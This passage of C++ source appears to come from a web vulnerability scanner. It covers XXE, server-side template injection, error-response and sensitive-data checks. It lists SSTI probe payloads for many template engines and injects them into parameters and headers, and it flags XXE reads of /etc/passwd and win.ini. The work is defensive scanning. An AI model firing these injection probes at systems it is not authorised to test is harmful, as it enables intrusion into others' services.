                            if (match.pattern_name.find("passwd") != std::string::npos) {
                                accessed_file = "/etc/passwd";
                            } else if (match.pattern_name.find("win.ini") != std::string::npos || 
                                      match.pattern_name.find("windows") != std::string::npos) {
                                accessed_file = "C:\\Windows\\win.ini";
                            } else if (match.pattern_name.find("hosts") != std::string::npos) {
                                accessed_file = "/etc/hosts";
                            }
                            break;
                        }
                    }
                }
                
                // Check for command output (might indicate SSRF via XXE)
                if (analysis.has_command_output && xxe_payload.payload_type == "ssrf") {
                    indicates_xxe = true;
                    xxe_confidence = std::max(xxe_confidence, 0.90);
                    if (detection_method.empty()) {
                        detection_method = "ssrf";
                    }
                }
            }
            
            // 3. Check for blind XXE indicators
            if (xxe_payload.payload_type == "blind") {
                // For blind XXE with OOB, we'll verify callback after all payloads
                // For now, just mark that we need to verify
                // If no callback URL, check for error messages
                if (callback_url_.empty()) {
                    if (test_resp.status >= 400 && test_resp.status < 500) {
                        // Error might indicate entity processing attempt
                        std::string lower_body = test_resp.body;
                        std::transform(lower_body.begin(), lower_body.end(), lower_body.begin(), ::tolower);
                        
                        if (lower_body.find("entity") != std::string::npos ||
                            lower_body.find("external") != std::string::npos ||
                            lower_body.find("doctype") != std::string::npos) {
                            indicates_xxe = true;
                            xxe_confidence = 0.75;
                            detection_method = "blind";
                        }
                    }
                }
            }
            
            // 4. Check for parameter entity processing
            if (xxe_payload.payload.find("%") != std::string::npos && 
                xxe_payload.payload.find("<!ENTITY %") != std::string::npos) {
                // Parameter entity detected in payload
                // If we get a response (not just an error), it might be processed
                if (test_resp.status >= 200 && test_resp.status < 500) {
                    indicates_xxe = true;
                    xxe_confidence = std::max(xxe_confidence, 0.80);
                    if (detection_method.empty()) {
                        detection_method = "parameter_entity";
                    }
                }
            }
            
            if (indicates_xxe && xxe_confidence >= confidenceThreshold_) {
                Finding f;
                f.id = "finding_" + std::to_string(findings.size() + 1);
                f.url = result.url;
                f.method = result.method;
                f.category = "xxe";
                f.headers = std::map<std::string, std::string>(
                    result.headers.begin(),
                    result.headers.end()
                );
                
                nlohmann::json evidence;
                evidence["description"] = "XML External Entity (XXE) vulnerability detected";
                evidence["payload"] = xxe_payload.payload;
                evidence["payload_type"] = xxe_payload.payload_type;
                evidence["detection_method"] = detection_method;
                evidence["parameter"] = param_name;
                evidence["status"] = test_resp.status;
                
                if (!accessed_file.empty()) {
                    evidence["accessed_file"] = accessed_file;
                }
                evidence["target_file"] = xxe_payload.target_file;
                
                // Add response analysis if available
                if (response_analyzer_) {
                    std::map<std::string, std::string> resp_headers_map;
                    for (const auto& [key, value] : test_resp.headers) {
                        resp_headers_map[key] = value;
                    }
                    AnalysisResult analysis = response_analyzer_->analyze(test_resp.body, resp_headers_map);
                    
                    if (analysis.has_file_content) {
                        nlohmann::json matches_json = nlohmann::json::array();
                        for (const auto& match : analysis.matches) {
                            if (match.type == PatternType::FILE_CONTENT) {
                                nlohmann::json match_json;
                                match_json["pattern"] = match.pattern_name;
                                match_json["evidence"] = match.evidence;
                                match_json["context"] = match.context;
                                matches_json.push_back(match_json);
                            }
                        }
                        if (!matches_json.empty()) {
                            evidence["file_content_matches"] = matches_json;
                        }
                    }
                }
                
                evidence["response_length"] = test_resp.body.size();
                evidence["confidence"] = xxe_confidence;
                
                f.evidence = evidence;
                f.severity = (xxe_confidence >= 0.90) ? "critical" : "high";
                f.confidence = xxe_confidence;
                f.remediation_id = "xxe";
                
                findings.push_back(std::move(f));
                
                // Only report first successful detection per parameter
                break;
            }
        }
        
        // Verify OOB callbacks after all payloads for this parameter are sent
        if (!param_oob_tokens.empty()) {
            // Wait a bit for callback to arrive
            std::this_thread::sleep_for(std::chrono::seconds(3));
            
            for (const auto& token : param_oob_tokens) {
                if (verifyCallbackReceived(token)) {
                    // OOB callback verified - create finding
                    Finding f;
                    f.id = "finding_" + std::to_string(findings.size() + 1);
                    f.url = result.url;
                    f.method = result.method;
                    f.category = "xxe";
                    f.headers = std::map<std::string, std::string>(
                        result.headers.begin(),
                        result.headers.end()
                    );
                    
                    nlohmann::json evidence;
                    evidence["description"] = "XML External Entity (XXE) vulnerability detected via out-of-band callback";
                    evidence["detection_method"] = "out-of-band";
                    evidence["callback_url"] = callback_url_;
                    evidence["token"] = token;
                    evidence["parameter"] = param_name;
                    evidence["confidence"] = 0.90;
                    
                    f.evidence = evidence;
                    f.severity = "high";
                    f.confidence = 0.90;
                    f.remediation_id = "xxe";
                    
                    findings.push_back(std::move(f));
                    
                    // Remove token from active tracking
                    active_tokens_.erase(token);
                    break;  // Only report first OOB detection per parameter
                }
            }
        }
    }
}

// Helper function to identify template engine from payload and response
static std::string identify_template_engine(const std::string& payload, const std::string& response_body) {
    // Jinja2 indicators
    if (payload.find("{{") != std::string::npos && payload.find("}}") != std::string::npos) {
        // Check for Jinja2-specific patterns
        if (payload.find("{{7*'7'}}") != std::string::npos && response_body.find("7777777") != std::string::npos) {
            return "Jinja2";
        }
        if (payload.find("{{config}}") != std::string::npos || payload.find("{{self}}") != std::string::npos) {
            return "Jinja2";
        }
        // Could be Jinja2 or Handlebars
        if (response_body.find("49") != std::string::npos && payload.find("{{7*7}}") != std::string::npos) {
            return "Jinja2/Handlebars";
        }
    }
    
    // Twig indicators
    if (payload.find("{{") != std::string::npos && payload.find("}}") != std::string::npos) {
        if (payload.find("{{'7'*7}}") != std::string::npos && response_body.find("7777777") != std::string::npos) {
            return "Twig";
        }
        if (payload.find("{{_self}}") != std::string::npos) {
            return "Twig";
        }
    }
    
    // Freemarker indicators
    if (payload.find("${") != std::string::npos || payload.find("#{") != std::string::npos) {
        if (payload.find("${7*7}") != std::string::npos && response_body.find("49") != std::string::npos) {
            return "Freemarker";
        }
        if (payload.find("#{7*7}") != std::string::npos && response_body.find("49") != std::string::npos) {
            return "Freemarker";
        }
        if (payload.find("${.vars") != std::string::npos) {
            return "Freemarker";
        }
    }
    
    // Velocity indicators
    if (payload.find("#set") != std::string::npos || payload.find("$") != std::string::npos) {
        if (payload.find("#set($x=7*7)") != std::string::npos && response_body.find("49") != std::string::npos) {
            return "Velocity";
        }
        if (payload.find("$class") != std::string::npos) {
            return "Velocity";
        }
    }
    
    // Smarty indicators
    if (payload.find("{") != std::string::npos && payload.find("}") != std::string::npos && 
        payload.find("{php}") != std::string::npos) {
        return "Smarty";
    }
    if (payload.find("{7*7}") != std::string::npos && response_body.find("49") != std::string::npos) {
        return "Smarty";
    }
    
    // Mako indicators
    if (payload.find("${") != std::string::npos || payload.find("<%") != std::string::npos) {
        if (payload.find("${7*7}") != std::string::npos && response_body.find("49") != std::string::npos) {
            return "Mako";
        }
        if (payload.find("<% 7*7 %>") != std::string::npos && response_body.find("49") != std::string::npos) {
            return "Mako";
        }
    }
    
    // ERB (Ruby) indicators
    if (payload.find("<%=") != std::string::npos || payload.find("<%") != std::string::npos) {
        if (payload.find("<%= 7*7 %>") != std::string::npos && response_body.find("49") != std::string::npos) {
            return "ERB";
        }
        if (payload.find("<% 7*7 %>") != std::string::npos) {
            return "ERB";
        }
    }
    
    // JSP indicators
    if (payload.find("${") != std::string::npos || payload.find("<%") != std::string::npos) {
        if (payload.find("${7*7}") != std::string::npos && response_body.find("49") != std::string::npos) {
            return "JSP";
        }
        if (payload.find("<% 7*7 %>") != std::string::npos) {
            return "JSP";
        }
    }
    
    // ASP.NET indicators
    if (payload.find("<%=") != std::string::npos || payload.find("<%") != std::string::npos) {
        if (payload.find("<%= 7*7 %>") != std::string::npos && response_body.find("49") != std::string::npos) {
            return "ASP.NET";
        }
        if (payload.find("<% 7*7 %>") != std::string::npos) {
            return "ASP.NET";
        }
    }
    
    return "Unknown";
}

// Helper function to check if template evaluation was successful
static bool is_template_evaluated(const std::string& payload, const std::string& response_body) {
    // Check for mathematical evaluation results
    if (payload.find("7*7") != std::string::npos) {
        if (response_body.find("49") != std::string::npos) {
            return true;
        }
    }
    
    // Check for string multiplication (Jinja2: {{7*'7'}} = 7777777)
    if (payload.find("7*'7'") != std::string::npos || payload.find("'7'*7") != std::string::npos) {
        if (response_body.find("7777777") != std::string::npos) {
            return true;
        }
    }
    
    // Check if payload syntax appears in response (indicates evaluation)
    // But make sure it's not just reflection
    if (payload.find("{{") != std::string::npos) {
        // If we see the result but not the raw payload, it was evaluated
        if (response_body.find("49") != std::string::npos && 
            response_body.find("{{7*7}}") == std::string::npos) {
            return true;
        }
    }
    
    if (payload.find("${") != std::string::npos) {
        if (response_body.find("49") != std::string::npos && 
            response_body.find("${7*7}") == std::string::npos) {
            return true;
        }
    }
    
    if (payload.find("<%=") != std::string::npos) {
        if (response_body.find("49") != std::string::npos && 
            response_body.find("<%= 7*7 %>") == std::string::npos) {
            return true;
        }
    }
    
    return false;
}

void VulnEngine::checkSSTI(const CrawlResult& result, std::vector<Finding>& findings) {
    // SSTI payloads for different template engines
    struct SSTIPayload {
        std::string payload;
        std::string engine;  // "Jinja2", "Twig", "Freemarker", "Velocity", "Smarty", "Mako", "ERB", "JSP", "ASP.NET", "Handlebars"
        std::string expected_result;  // Expected evaluation result
        double confidence_boost;  // Additional confidence if detected
    };
    
    // Jinja2 payloads
    std::vector<SSTIPayload> jinja2_payloads = {
        {"{{7*7}}", "Jinja2", "49", 0.95},
        {"{{7*'7'}}", "Jinja2", "7777777", 0.98},
        {"{{config}}", "Jinja2", "", 0.90},
        {"{{self}}", "Jinja2", "", 0.90}
    };
    
    // Twig payloads
    std::vector<SSTIPayload> twig_payloads = {
        {"{{7*7}}", "Twig", "49", 0.95},
        {"{{'7'*7}}", "Twig", "7777777", 0.98},
        {"{{_self}}", "Twig", "", 0.90}
    };
    
    // Freemarker payloads
    std::vector<SSTIPayload> freemarker_payloads = {
        {"${7*7}", "Freemarker", "49", 0.95},
        {"#{7*7}", "Freemarker", "49", 0.95},
        {"${.vars.getClass()}", "Freemarker", "", 0.90}
    };
    
    // Velocity payloads
    std::vector<SSTIPayload> velocity_payloads = {
        {"#set($x=7*7)$x", "Velocity", "49", 0.95},
        {"$class", "Velocity", "", 0.85}
    };
    
    // Smarty payloads
    std::vector<SSTIPayload> smarty_payloads = {
        {"{7*7}", "Smarty", "49", 0.95},
        {"{php}echo 7*7;{/php}", "Smarty", "49", 0.98}
    };
    
    // Mako payloads
    std::vector<SSTIPayload> mako_payloads = {
        {"${7*7}", "Mako", "49", 0.95},
        {"<% 7*7 %>", "Mako", "49", 0.95}
    };
    
    // ERB payloads
    std::vector<SSTIPayload> erb_payloads = {
        {"<%= 7*7 %>", "ERB", "49", 0.95},
        {"<% 7*7 %>", "ERB", "", 0.90}
    };
    
    // JSP payloads
    std::vector<SSTIPayload> jsp_payloads = {
        {"${7*7}", "JSP", "49", 0.95},
        {"<% 7*7 %>", "JSP", "", 0.90}
    };
    
    // ASP.NET payloads
    std::vector<SSTIPayload> aspnet_payloads = {
        {"<%= 7*7 %>", "ASP.NET", "49", 0.95},
        {"<% 7*7 %>", "ASP.NET", "", 0.90}
    };
    
    // Handlebars payloads
    std::vector<SSTIPayload> handlebars_payloads = {
        {"{{7*7}}", "Handlebars", "49", 0.95}
    };
    
    // Combine all payloads
    std::vector<SSTIPayload> all_payloads;
    all_payloads.insert(all_payloads.end(), jinja2_payloads.begin(), jinja2_payloads.end());
    all_payloads.insert(all_payloads.end(), twig_payloads.begin(), twig_payloads.end());
    all_payloads.insert(all_payloads.end(), freemarker_payloads.begin(), freemarker_payloads.end());
    all_payloads.insert(all_payloads.end(), velocity_payloads.begin(), velocity_payloads.end());
    all_payloads.insert(all_payloads.end(), smarty_payloads.begin(), smarty_payloads.end());
    all_payloads.insert(all_payloads.end(), mako_payloads.begin(), mako_payloads.end());
    all_payloads.insert(all_payloads.end(), erb_payloads.begin(), erb_payloads.end());
    all_payloads.insert(all_payloads.end(), jsp_payloads.begin(), jsp_payloads.end());
    all_payloads.insert(all_payloads.end(), aspnet_payloads.begin(), aspnet_payloads.end());
    all_payloads.insert(all_payloads.end(), handlebars_payloads.begin(), handlebars_payloads.end());
    
    // Test all parameters (GET params, POST body, headers)
    std::vector<std::pair<std::string, std::string>> test_locations;
    
    // GET parameters
    for (const auto& [param, value] : result.params) {
        test_locations.push_back({"param", param});
    }
    
    // POST/PUT body
    bool is_post_put = (result.method == "POST" || result.method == "PUT");
    if (is_post_put && result.params.empty()) {
        test_locations.push_back({"body", "body"});
    }
    
    // Headers (test common header names)
    std::vector<std::string> test_headers = {"X-Forwarded-For", "User-Agent", "Referer", "X-Requested-With"};
    for (const auto& header_name : test_headers) {
        test_locations.push_back({"header", header_name});
    }
    
    // Create base request
    HttpRequest base_req;
    base_req.method = result.method;
    base_req.url = result.url;
    base_req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    
    // Add session cookies/headers if available
    enhance_request_with_session(base_req);
    
    // Get baseline response for comparison
    HttpResponse baseline_resp;
    bool baseline_established = false;
    
    if (baseline_comparator_) {
        HttpRequest baseline_req = base_req;
        if (client_.perform(baseline_req, baseline_resp)) {
            baseline_established = true;
        }
    }
    
    // Test each location with payloads
    for (const auto& [location_type, location_name] : test_locations) {
        for (const auto& ssti_payload : all_payloads) {
            HttpRequest test_req = base_req;
            
            // Inject payload based on location type
            if (location_type == "param") {
                // Inject into GET parameter
                test_req.url = build_url_with_param(result.url, result.params, location_name, ssti_payload.payload);
            } else if (location_type == "body") {
                // Inject into POST/PUT body
                test_req.body = ssti_payload.payload;
            } else if (location_type == "header") {
                // Inject into header
                test_req.headers[location_name] = ssti_payload.payload;
            }
            
            HttpResponse test_resp;
            if (!client_.perform(test_req, test_resp)) {
                continue;
            }
            
            // Check for SSTI indicators
            bool indicates_ssti = false;
            double ssti_confidence = 0.0;
            std::string detected_engine = "";
            
            // 1. Check for template evaluation
            if (is_template_evaluated(ssti_payload.payload, test_resp.body)) {
                indicates_ssti = true;
                ssti_confidence = 0.95;
                detected_engine = identify_template_engine(ssti_payload.payload, test_resp.body);
                if (detected_engine == "Unknown") {
                    detected_engine = ssti_payload.engine;
                }
            }
            
            // 2. Check for expected result in response
            if (!ssti_payload.expected_result.empty()) {
                if (test_resp.body.find(ssti_payload.expected_result) != std::string::npos) {
                    // Make sure it's not just the payload being reflected
                    if (test_resp.body.find(ssti_payload.payload) == std::string::npos) {
                        indicates_ssti = true;
                        ssti_confidence = std::max(ssti_confidence, 0.95);
                        if (detected_engine.empty()) {
                            detected_engine = ssti_payload.engine;
                        }
                    }
                }
            }
            
            // 3. Check response via ResponseAnalyzer
            if (response_analyzer_) {
                std::map<std::string, std::string> resp_headers_map;
                for (const auto& [key, value] : test_resp.headers) {
                    resp_headers_map[key] = value;
                }
                
                AnalysisResult analysis = response_analyzer_->analyze(test_resp.body, resp_headers_map);
                
                // Check for template-related errors or patterns
                // (ResponseAnalyzer might detect template errors)
                if (analysis.has_framework_error) {
                    std::string lower_body = test_resp.body;
                    std::transform(lower_body.begin(), lower_body.end(), lower_body.begin(), ::tolower);
                    
                    // Check for template engine error messages
                    if (lower_body.find("jinja") != std::string::npos ||
                        lower_body.find("twig") != std::string::npos ||
                        lower_body.find("freemarker") != std::string::npos ||
                        lower_body.find("velocity") != std::string::npos ||
                        lower_body.find("template") != std::string::npos) {
                        indicates_ssti = true;
                        ssti_confidence = std::max(ssti_confidence, 0.85);
                        if (detected_engine.empty()) {
                            detected_engine = ssti_payload.engine;
                        }
                    }
                }
            }
            
            // 4. Baseline comparison (check for significant content changes)
            if (baseline_comparator_ && baseline_established) {
                ComparisonResult comparison = baseline_comparator_->compare(
                    baseline_resp, test_resp, TimingBaseline(), 0.0, ssti_payload.payload);
                
                // If response is significantly different and contains evaluation result
                if (comparison.similarity_score < 0.7 && 
                    !ssti_payload.expected_result.empty() &&
                    test_resp.body.find(ssti_payload.expected_result) != std::string::npos) {
                    indicates_ssti = true;
                    ssti_confidence = std::max(ssti_confidence, 0.80);
                    if (detected_engine.empty()) {
                        detected_engine = ssti_payload.engine;
                    }
                }
            }
            
            if (indicates_ssti && ssti_confidence >= confidenceThreshold_) {
                Finding f;
                f.id = "finding_" + std::to_string(findings.size() + 1);
                f.url = result.url;
                f.method = result.method;
                f.category = "ssti";
                f.headers = std::map<std::string, std::string>(
                    result.headers.begin(),
                    result.headers.end()
                );
                
                nlohmann::json evidence;
                evidence["description"] = "Server-Side Template Injection (SSTI) detected";
                evidence["payload"] = ssti_payload.payload;
                evidence["template_engine"] = detected_engine;
                evidence["location"] = location_type;
                evidence["location_name"] = location_name;
                evidence["status"] = test_resp.status;
                
                if (!ssti_payload.expected_result.empty()) {
                    evidence["expected_result"] = ssti_payload.expected_result;
                    evidence["result_found"] = (test_resp.body.find(ssti_payload.expected_result) != std::string::npos);
                }
                
                // Add response snippet showing evaluation
                if (test_resp.body.size() > 0) {
                    size_t snippet_size = std::min<size_t>(200, test_resp.body.size());
                    evidence["response_snippet"] = test_resp.body.substr(0, snippet_size);
                }
                
                evidence["response_length"] = test_resp.body.size();
                evidence["confidence"] = ssti_confidence;
                
                f.evidence = evidence;
                f.severity = "critical";
                f.confidence = ssti_confidence;
                f.remediation_id = "ssti";
                
                findings.push_back(std::move(f));
                
                // Only report first successful detection per location
                break;
            }
        }
    }
}

void VulnEngine::checkResponsePatterns(const CrawlResult& result, std::vector<Finding>& findings) {
    if (!response_analyzer_) {
        return;
    }
    
    // Fetch the response body by making an HTTP request
    HttpRequest req;
    req.method = result.method;
    req.url = result.url;
    req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    enhance_request_with_session(req);
    
    HttpResponse resp;
    if (!client_.perform(req, resp)) {
        return; // Can't analyze if request fails
    }
    
    // Convert headers to map format
    std::map<std::string, std::string> headers_map;
    for (const auto& [key, value] : result.headers) {
        headers_map[key] = value;
    }
    // Also add response headers
    for (const auto& [key, value] : resp.headers) {
        headers_map[key] = value;
    }
    
    // Analyze response body
    AnalysisResult analysis = response_analyzer_->analyze(resp.body, headers_map);
    
    if (!analysis.has_indicators()) {
        return;
    }
    
    // Create findings for each detected pattern type
    if (analysis.has_sql_error) {
        Finding f;
        f.id = "finding_" + std::to_string(findings.size() + 1);
        f.url = result.url;
        f.method = result.method;
        f.category = "sql_injection_error";
        f.headers = std::map<std::string, std::string>(
            result.headers.begin(),
            result.headers.end()
        );
        
        std::string db_name = "Unknown";
        switch (analysis.detected_db_type) {
            case DatabaseType::MYSQL: db_name = "MySQL"; break;
            case DatabaseType::POSTGRESQL: db_name = "PostgreSQL"; break;
            case DatabaseType::SQL_SERVER: db_name = "SQL Server"; break;
            case DatabaseType::ORACLE: db_name = "Oracle"; break;
            default: break;
        }
        
        nlohmann::json evidence;
        evidence["database_type"] = db_name;
        evidence["description"] = "SQL error message detected in response";
        evidence["summary"] = analysis.summary;
        
        // Add evidence from matches
        nlohmann::json matches_json = nlohmann::json::array();
        for (const auto& match : analysis.matches) {
            if (match.type == PatternType::SQL_ERROR) {
                nlohmann::json match_json;
                match_json["pattern"] = match.pattern_name;
                match_json["evidence"] = match.evidence;
                match_json["context"] = match.context;
                match_json["confidence"] = match.confidence;
                matches_json.push_back(match_json);
            }
        }
        evidence["matches"] = matches_json;
        
        f.evidence = evidence;
        f.severity = "high";
        f.confidence = 0.9;
        f.remediation_id = "sql_injection";
        
        findings.push_back(std::move(f));
    }
    
    if (analysis.has_command_output || analysis.has_file_content) {
        Finding f;
        f.id = "finding_" + std::to_string(findings.size() + 1);
        f.url = result.url;
        f.method = result.method;
        f.category = "command_execution_output";
        f.headers = std::map<std::string, std::string>(
            result.headers.begin(),
            result.headers.end()
        );
        
        nlohmann::json evidence;
        evidence["description"] = "Command execution or file content detected in response";
        evidence["summary"] = analysis.summary;
        
        nlohmann::json matches_json = nlohmann::json::array();
        for (const auto& match : analysis.matches) {
            if (match.type == PatternType::COMMAND_OUTPUT || match.type == PatternType::FILE_CONTENT) {
                nlohmann::json match_json;
                match_json["pattern"] = match.pattern_name;
                match_json["type"] = (match.type == PatternType::COMMAND_OUTPUT) ? "command_output" : "file_content";
                match_json["evidence"] = match.evidence;
                match_json["context"] = match.context;
                match_json["confidence"] = match.confidence;
                matches_json.push_back(match_json);
            }
        }
        evidence["matches"] = matches_json;
        
        f.evidence = evidence;
        f.severity = "high";
        f.confidence = 0.85;
        f.remediation_id = "command_injection";
        
        findings.push_back(std::move(f));
    }
    
    if (analysis.has_stack_trace || analysis.has_framework_error) {
        Finding f;
        f.id = "finding_" + std::to_string(findings.size() + 1);
        f.url = result.url;
        f.method = result.method;
        f.category = "information_disclosure";
        f.headers = std::map<std::string, std::string>(
            result.headers.begin(),
            result.headers.end()
        );
        
        nlohmann::json evidence;
        evidence["description"] = "Stack trace or framework error detected in response";
        evidence["summary"] = analysis.summary;
        evidence["framework"] = analysis.detected_framework;
        
        nlohmann::json matches_json = nlohmann::json::array();
        for (const auto& match : analysis.matches) {
            if (match.type == PatternType::STACK_TRACE || match.type == PatternType::FRAMEWORK_ERROR) {
                nlohmann::json match_json;
                match_json["pattern"] = match.pattern_name;
                match_json["type"] = (match.type == PatternType::STACK_TRACE) ? "stack_trace" : "framework_error";
                match_json["framework"] = match.framework;
                match_json["evidence"] = match.evidence;
                match_json["context"] = match.context;
                match_json["confidence"] = match.confidence;
                matches_json.push_back(match_json);
            }
        }
        evidence["matches"] = matches_json;
        
        f.evidence = evidence;
        f.severity = "medium";
        f.confidence = 0.8;
        f.remediation_id = "error_handling";
        
        findings.push_back(std::move(f));
    }
    
    if (analysis.has_debug_info) {
        Finding f;
        f.id = "finding_" + std::to_string(findings.size() + 1);
        f.url = result.url;
        f.method = result.method;
        f.category = "information_disclosure";
        f.headers = std::map<std::string, std::string>(
            result.headers.begin(),
            result.headers.end()
        );
        
        nlohmann::json evidence;
        evidence["description"] = "Debug information exposed in response";
        evidence["summary"] = analysis.summary;
        
        nlohmann::json matches_json = nlohmann::json::array();
        for (const auto& match : analysis.matches) {
            if (match.type == PatternType::DEBUG_INFO) {
                nlohmann::json match_json;
                match_json["pattern"] = match.pattern_name;
                match_json["evidence"] = match.evidence;
                match_json["context"] = match.context;
                match_json["confidence"] = match.confidence;
                matches_json.push_back(match_json);
            }
        }
        evidence["matches"] = matches_json;
        
        f.evidence = evidence;
        f.severity = "low";
        f.confidence = 0.75;
        f.remediation_id = "debug_info";
        
        findings.push_back(std::move(f));
    }
}

void VulnEngine::checkSensitiveDataExposure(const CrawlResult& result, std::vector<Finding>& findings) {
    if (!response_analyzer_) {
        return;
    }
    
    // Fetch the response body by making an HTTP request
    HttpRequest req;
    req.method = result.method;
    req.url = result.url;
    req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    
    // Add headers from crawl result
    for (const auto& [key, value] : result.headers) {
        req.headers[key] = value;
    }
    
    // Add body if present (for POST/PUT requests)
    if ((result.method == "POST" || result.method == "PUT") && !result.params.empty()) {
        // Build form-encoded body from params
        std::ostringstream body_stream;
        bool first = true;
        for (const auto& [key, value] : result.params) {
            if (!first) body_stream << "&";
            body_stream << key << "=" << value;
            first = false;
        }
        req.body = body_stream.str();
    }
    
    enhance_request_with_session(req);
    
    HttpResponse resp;
    if (!client_.perform(req, resp)) {
        return; // Can't analyze if request fails
    }
    
    // Convert the header vector to a map for easier lookup
    std::map<std::string, std::string> resp_headers_map;
    for (const auto& [key, value] : result.headers) {
        resp_headers_map[key] = value;
    }
    // Also add response headers
    for (const auto& [key, value] : resp.headers) {
        resp_headers_map[key] = value;
    }
    
    // Analyze the response body for sensitive data patterns
    AnalysisResult analysis = response_analyzer_->analyze(resp.body, resp_headers_map);
    
    if (!analysis.has_sensitive_data) {
        return;
    }
    
    // Group matches by data type
    std::map<std::string, std::vector<PatternMatch>> matches_by_type;
    std::set<std::string> detected_types;
    
    for (const auto& match : analysis.matches) {
        if (match.type == PatternType::SENSITIVE_DATA) {
            std::string data_type = "unknown";
            
            // Identify data type from pattern name
            if (match.pattern_name.find("credit_card") != std::string::npos) {
                data_type = "credit_card";
            } else if (match.pattern_name.find("ssn") != std::string::npos) {
                data_type = "ssn";
            } else if (match.pattern_name.find("api_key") != std::string::npos || 
                       match.pattern_name.find("jwt") != std::string::npos ||
                       match.pattern_name.find("oauth") != std::string::npos) {
                data_type = "credential";
            } else if (match.pattern_name.find("password") != std::string::npos) {
                data_type = "password";
            } else if (match.pattern_name.find("sensitive_field") != std::string::npos) {
                data_type = "sensitive_field";
            }
            
            matches_by_type[data_type].push_back(match);
            detected_types.insert(data_type);
        }
    }
    
    // Check for excessive data exposure (over-fetching)
    // This is context-aware: if we're in a user profile endpoint and see expected user data, it's less concerning
    bool is_user_profile = (result.url.find("/profile") != std::string::npos ||
                           result.url.find("/user") != std::string::npos ||
                           result.url.find("/account") != std::string::npos);
    
    // Check for JSON/XML structure to detect sensitive field names
    bool is_json = (resp.body.find('{') != std::string::npos && resp.body.find('}') != std::string::npos);
    bool is_xml = (resp.body.find('<') != std::string::npos && resp.body.find('>') != std::string::npos);
    
    // Check for sensitive field names in structured data
    std::vector<std::string> sensitive_field_names = {
        "password", "passwd", "pwd", "secret", "private_key", "api_secret",
        "access_token", "refresh_token", "session_id", "auth_token",
        "bearer_token", "ssn", "social_security", "credit_card", "card_number",
        "cvv", "cvc", "pin", "tax_id"
    };
    
    std::vector<std::string> found_sensitive_fields;
    std::string lower_body = resp.body;
    std::transform(lower_body.begin(), lower_body.end(), lower_body.begin(), ::tolower);
    
    for (const auto& field_name : sensitive_field_names) {
        std::string search_pattern;
        if (is_json) {
            search_pattern = "\"" + field_name + "\"";
        } else if (is_xml) {
            search_pattern = "<" + field_name;
        } else {
            search_pattern = field_name + "[:=]";
        }
        
        if (lower_body.find(search_pattern) != std::string::npos) {
            found_sensitive_fields.push_back(field_name);
        }
    }
    
    // Create findings for each detected sensitive data type
    for (const auto& data_type : detected_types) {
        const auto& matches = matches_by_type[data_type];
        
        // Skip if this is expected user data in a profile endpoint (context-aware)
        if (is_user_profile && (data_type == "ssn" || data_type == "credit_card")) {
            // Still flag it but with lower confidence if it's the user's own data
            // For now, we'll flag it but note the context
        }
        
        Finding f;
        f.id = "sensitive_data_exposure_" + data_type;
        f.url = result.url;
        f.method = result.method;
        f.category = "sensitive_data_exposure";
        
        // Build evidence
        nlohmann::json evidence;
        evidence["data_type"] = data_type;
        evidence["detection_method"] = "pattern_matching";
        
        nlohmann::json matches_json = nlohmann::json::array();
        for (const auto& match : matches) {
            nlohmann::json match_json;
            match_json["pattern_name"] = match.pattern_name;
            match_json["evidence"] = match.evidence;
            match_json["confidence"] = match.confidence;
            if (!match.context.empty()) {
                match_json["context"] = match.context;
            }
            matches_json.push_back(match_json);
        }
        evidence["matches"] = matches_json;
        
        // Add sensitive field names if found
        if (!found_sensitive_fields.empty()) {
            evidence["sensitive_field_names"] = found_sensitive_fields;
        }
        
        // Add context information
        evidence["is_user_profile"] = is_user_profile;
        evidence["response_format"] = is_json ? "json" : (is_xml ? "xml" : "unknown");
        
        // Calculate confidence based on matches and context
        double max_confidence = 0.0;
        for (const auto& match : matches) {
            max_confidence = std::max(max_confidence, match.confidence);
        }
        
        // Reduce confidence if it's expected user data in profile endpoint
        if (is_user_profile && (data_type == "ssn" || data_type == "credit_card")) {
            max_confidence *= 0.7;  // Reduce confidence for expected user data
        }
        
        f.confidence = max_confidence;
        
        // Set severity based on data type
        if (data_type == "credit_card" || data_type == "ssn" || data_type == "password") {
            f.severity = "high";
        } else if (data_type == "credential") {
            f.severity = "critical";
        } else {
            f.severity = "medium";
        }
        
        // Add response snippet (first 500 chars)
        std::string response_snippet = resp.body.substr(0, 500);
        if (resp.body.length() > 500) {
            response_snippet += "...";
        }
        evidence["response_snippet"] = response_snippet;
        
        f.evidence = evidence;
        f.remediation_id = "sensitive_data_exposure";
        
        findings.push_back(std::move(f));
    }
    
    // Create separate finding for sensitive field names if found in structured data
    if (!found_sensitive_fields.empty() && (is_json || is_xml)) {
        // Check if we already created a finding for sensitive_field type
        bool already_reported = false;
        for (const auto& data_type : detected_types) {
            if (data_type == "sensitive_field") {
                already_reported = true;
                break;
            }
        }
        
        if (!already_reported) {
            Finding f;
            f.id = "sensitive_data_exposure_sensitive_fields";
            f.url = result.url;
            f.method = result.method;
            f.category = "sensitive_data_exposure";
            f.severity = "medium";
            f.confidence = 0.75;
            f.remediation_id = "sensitive_data_exposure";
            
            nlohmann::json evidence;
            evidence["data_type"] = "sensitive_field_names";
            evidence["detection_method"] = "field_name_analysis";
            evidence["sensitive_field_names"] = found_sensitive_fields;
            evidence["response_format"] = is_json ? "json" : "xml";
            
            std::string response_snippet = resp.body.substr(0, 500);
            if (resp.body.length() > 500) {
                response_snippet += "...";
            }
            evidence["response_snippet"] = response_snippet;
            
            f.evidence = evidence;
            findings.push_back(std::move(f));
        }
    }
}

void VulnEngine::enhance_request_with_session(HttpRequest& req, const std::string& user_id) const {
    if (!session_manager_) {
        return;
    }
    
    std::string effective_user_id = user_id;
    
    // If no user_id specified, use first active session
    if (effective_user_id.empty()) {
        auto active_sessions = session_manager_->get_active_sessions();
        if (active_sessions.empty()) {
            return;
        }
        effective_user_id = active_sessions[0];
    }
    
    // Add session cookies
    auto cookies = session_manager_->get_cookies(effective_user_id);
    if (!cookies.empty()) {
        std::string cookie_header = HttpClient::build_cookie_header(cookies);
        if (!cookie_header.empty()) {
            req.headers["Cookie"] = cookie_header;
        }
    }
    
    // Add authentication headers
    auto auth_headers = session_manager_->get_auth_headers(effective_user_id);
    for (const auto& [key, value] : auth_headers) {
        req.headers[key] = value;
    }
}

// Batch processing of crawl results
std::vector<Finding> VulnEngine::analyze(const std::vector <CrawlResult>& crawl_results) {
    std::vector<Finding> findings;

    for (const auto& result : crawl_results) {
